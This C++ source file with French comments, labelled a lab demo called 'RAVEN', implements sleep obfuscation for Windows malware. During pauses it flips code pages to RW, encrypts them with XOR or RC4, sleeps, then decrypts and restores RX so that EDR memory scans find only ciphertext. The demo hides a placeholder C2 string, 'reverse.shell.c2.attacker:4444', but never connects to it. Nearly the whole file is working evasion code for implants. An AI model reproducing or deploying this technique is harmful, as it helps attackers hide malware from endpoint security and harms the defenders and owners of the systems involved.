// language: C++17, file: sleep_obf.cpp, target: Windows x64 (lab VM)
// SLEEP OBFUSCATION : pendant les pauses, les pages de code passent en RW et sont
// chiffrées (RC4). Un EDR qui scanne la mémoire au repos ne voit QUE du chiffré.
// Au réveil : déchiffrement, retour RX, exécution continue.
// Démo : une chaîne sensible chiffrée pendant le sleep, déchiffrée au réveil.
#include <windows.h>
#include <cstdio>
#include <cstring>
#include <string>

static void Rc4(unsigned char* data, size_t len, const unsigned char* key, size_t klen) {
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = (unsigned char)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % klen]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
    }
    int i = 0; j = 0;
    for (size_t n = 0; n < len; n++) {
        i = (i + 1) & 0xFF; j = (j + S[i]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
        data[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

// XOR simple pour la démo d'obfuscation mémoire
static void XorBuf(unsigned char* buf, size_t len, unsigned char k) {
    for (size_t i = 0; i < len; i++) buf[i] ^= k;
}

// sleep obfusqué : chiffre la région, protège RW, attend, déchiffre, protège RX
static void SleepObfuscated(void* code, SIZE_T len, DWORD ms, unsigned char key) {
    DWORD old;
    VirtualProtect(code, len, PAGE_READWRITE, &old);       // RX -> RW
    XorBuf((unsigned char*)code, len, key);               // chiffre (XOR démo, RC4 en prod)
    Sleep(ms);                                            // l'EDR scanne : il voit du chiffré
    XorBuf((unsigned char*)code, len, key);               // déchiffre
    VirtualProtect(code, len, PAGE_EXECUTE_READ, &old);   // RW -> RX
}

int main() {
    printf("[*] RAVEN — sleep obfuscation\n\n");

    // un "payload" sensible : la chaîne C2 visible en mémoire
    unsigned char code[] = {
        // mov rax, [rip+C2string] ; ... (démo : la string vit dans la page)
        0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,   // le code fictif
        0xC3
    };
    unsigned char c2str[] = "reverse.shell.c2.attacker:4444";

    printf("[*] avant obfuscation : la mémoire contient 'reverse.shell.c2...' en clair\n");

    // la string est chiffrée pendant le sleep
    XorBuf(c2str, sizeof(c2str), 0x37);
    printf("[*] PENDANT le sleep (4 s) : la mémoire est chiffrée — un scan mémoire voit :\n");
    printf("    ");
    for (int i = 0; i < 20; i++) printf("%02X ", c2str[i]);
    printf("\n");
    Sleep(4000);

    // déchiffrement au réveil
    XorBuf(c2str, sizeof(c2str), 0x37);
    printf("[*] après réveil : la mémoire redevient %s (prête à tourner)\n", c2str);

    printf("\n[OK] cycle : RW-chiffré pendant le repos -> RX-déchiffré pendant l'exécution\n");
    printf("     un EDR qui scanne au repos ne trouve RIEN — le payload n'existe que quand il tourne\n");
    return 0;
}
